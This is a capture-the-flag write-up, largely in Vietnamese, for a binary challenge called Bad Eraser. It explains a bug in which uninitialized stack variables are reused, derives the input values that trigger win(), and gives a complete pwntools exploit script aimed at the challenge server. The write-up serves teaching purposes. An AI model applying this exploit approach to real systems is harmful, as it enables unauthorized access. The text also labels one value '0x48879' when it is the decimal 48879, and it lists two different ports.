## Challenge Description
You are helping run the Brick Workshop, where every batch is tested for clutch power before shipping. The diagnostics station claims to require a two-step calibration, but something feels off about how it remembers old mold IDs and pigment codes. Can you use the workshop menu to force a perfect test result and unlock Master Builder status?
> nc bad-eraser-brick-workshop.pwn.ctf.umasscybersec.org 32768

## Check source file và xác định flow chương trình
Challenge này cung cấp một `.zip` file, giải nén ra ta nhận được một file `bad_eraser.c` và binary của nó. Kiểm tra source code `.c` của chương trình này, ta xác định được các function chính như sau:
- `banner()` in menu
- `preview_brick()` và `erase_station()` chỉ nhập/xuất chuỗi an toàn (`%47s`, `%95s`)
- `clutch_score(mold_id, pigment_code)` tính điểm
- `diagnostics_bay(...)`: nếu điểm đúng thì gọi `win()`
- `workshop_turn()`: xử lý từng lượt menu

Ở đoạn code xử lý của chương trình (`workshop_turn()`), ta nhận diện được đoạn code sau:
```c
static int service_initialized = 0;

static void workshop_turn(void) {
    int choice;
    unsigned int mold_id;
    unsigned int pigment_code;

    ... đọc choice ...

    if (choice != 3) ...

    if (!service_initialized) {
        scanf("%u %u", &mold_id, &pigment_code);
        service_initialized = 1;
        return;
    }

    diagnostics_bay(mold_id, pigment_code);
}
```

Cụ thể trong đoạn code này, ở lần đầu nếu `choice == 3`, chương trình sẽ đọc `mold_id`, `pigment_code`, đặt `service_initialized == 1` và `return`. Nếu thực hiện chọn `choice == 3` một lần nữa, do `service_initialized` đã được set là true trong lần chọn trước, chương trình sẽ **KHÔNG** đọc input mới mà thực hiện call `diagnostics_bay(mold_id, pigment_code);`.

`mold_id` và `pigment_code` là biến local stack của `workshop_turn()`, nên giá trị có thể chính là dữ liệu lượt trước còn lưu trên stack frame. Do đó local variable trong trường hợp này chưa được khởi tạo hợp lệ.

Đây là **logic/state bug với stack reuse**

## Xác định Win Condition
Trong `diagnostics_bay()`:

```c
clutch_score(mold_id, pigment_code) = (((mold_id >> 2) & 0x43u) | pigment_code) + (pigment_code << 1)

if (clutch_score(mold_id, pigment_code) == 0x23ccdu) {
    win();
}
```

Gọi:
```
a = ((mold_id >> 2) & 0x43)
```

Khi đó:
```
score = (a | p) + 2p
```

Chọn cách đơn giản nhất: `mold_id = 0` thì `a = 0`.

Khi đó:
```
score = p + 2p = 3p
```

Cần:
```
3p = 0x23ccd  
=> p = 0x23ccd / 3 = 0xbeef = 48879
```

=> Cặp hợp lệ: **`mold_id = 0`, `pigment_code = 48879`**.

## Hướng Exploit
Sau khi đã xác định lỗ hổng và hướng để call `win()`, thực hiện khai thác để lấy flag:
- Step 1: Vào menu diagnostics lần 1 (`choice=3`) để hệ thống “calibration”.
- Step 2: Gửi cặp `0x48879` để giá trị này nằm trên stack local của lượt đó.
- Step 3: Vào diagnostics lần 2 (`choice=3`) để nhánh `service_initialized == 1` dùng lại local stack cũ.
- Step 4: Điều kiện bằng `0x23ccd` được thỏa mãn, `win()` được gọi và in flag.

Source code exploit đầy đủ:
```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./bad_eraser", checksec=False)
context.arch = "amd64"

HOST = args.HOST or "bad-eraser-brick-workshop.pwn.ctf.umasscybersec.org"
PORT = int(args.PORT or 45002)
TARGET_SCORE = 0x23CCD


def start():
    if args.LOCAL:
        return process(elf.path)
    return remote(HOST, PORT)


def find_calibration_pair(target=TARGET_SCORE):
    # clutch_score(mold, pigment) = (((mold >> 2) & 0x43) | pigment) + 2*pigment
    # Choose mold=0 so (((mold >> 2) & 0x43) == 0, then score becomes 3*pigment.
    # pigment = target // 3 works when target % 3 == 0.
    if target % 3 == 0:
        pigment = target // 3
        mold = 0
        return mold, pigment

    # Generic fallback brute-force (rarely needed for this challenge).
    candidates_a = [0, 1, 2, 3, 0x40, 0x41, 0x42, 0x43]
    for pigment in range(0, 1 << 20):
        for a in candidates_a:
            if ((a | pigment) + (pigment << 1)) == target:
                mold = a << 2
                return mold, pigment
    raise ValueError("No valid calibration pair found")


def exploit(io):
    # Step 1: calculate valid values that force diagnostics to call win().
    mold_id, pigment_code = find_calibration_pair()
    log.info(f"Using mold_id={mold_id} pigment_code={pigment_code} (0x{pigment_code:x})")

    # Step 2: first diagnostics run initializes service and stores our pair
    # in stack locals of workshop_turn().
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Enter mold id and pigment code.\n", f"{mold_id} {pigment_code}".encode())

    # Step 3: second diagnostics run reuses uninitialized stack values.
    io.sendlineafter(b"> ", b"3")

    # If the remote has real flag.txt, output should contain flag here.
    io.interactive()


if __name__ == "__main__":
    io = start()
    exploit(io)
```
